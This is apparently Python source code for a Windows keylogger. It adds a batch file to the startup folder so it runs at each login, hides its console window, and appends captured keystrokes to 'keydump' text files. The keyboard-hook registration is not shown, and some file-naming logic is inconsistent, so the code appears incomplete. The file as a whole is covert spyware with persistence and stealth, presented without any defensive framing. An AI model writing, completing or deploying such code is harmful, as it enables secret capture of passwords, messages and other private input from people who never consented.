import os
import win32gui, win32con, win32console
from datetime import time, date

global count

def newbat(thispath, pypath, startup):
    try:
        with open(os.path.join(startup,"klg.bat"), "x") as file:
            file.write("@echo off\n")
            file.write(f"{pypath} {thispath}")
    except FileExistsError:
        return

def hidecmd():
    cwindow = win32console.GetConsoleWindow()
    win32gui.ShowWindow(cwindow, win32con.SW_HIDE)

def createfolder(folderdir):
    try:
        os.makedirs(folderdir)
    except FileExistsError:
        return

def createlog(folderdir, logname):
    try:
        open(os.path.join(folderdir, logname), "x")
    except FileExistsError:
        newdumpname = f"keydump({filecount(folderdir)}).txt"
        createlog(folderdir, newdumpname)


def updatelog(folderdir, logname, dumptxt):
    try:
        with open(os.path.join(folderdir, logname), "a") as file:
            match dumptxt:
                case "space":
                    file.write(" ")
                case "enter":
                    file.write(" [Enter] ")
                case "tab":
                    file.write(" [Tab] ")
            try:
                if ord(dumptxt) >= 32 and ord(dumptxt) <= 127:
                    file.write(dumptxt)  
            except TypeError:
                return
            
    except FileNotFoundError:
        createlog(folderdir, logname)

def filecount(folderdir):
    count = 0
    for files in os.listdir(folderdir):
        if files.endswith(".txt"):
            count += 1
    return count

def latestlog(count):
    if count == 0:
        return f"keydump.txt"
    return f"keydump{count}.txt"

def OnKeyboardEvent(folderdir, logname, dumptxt):
    updatelog(folderdir, logname, dumptxt)
    return

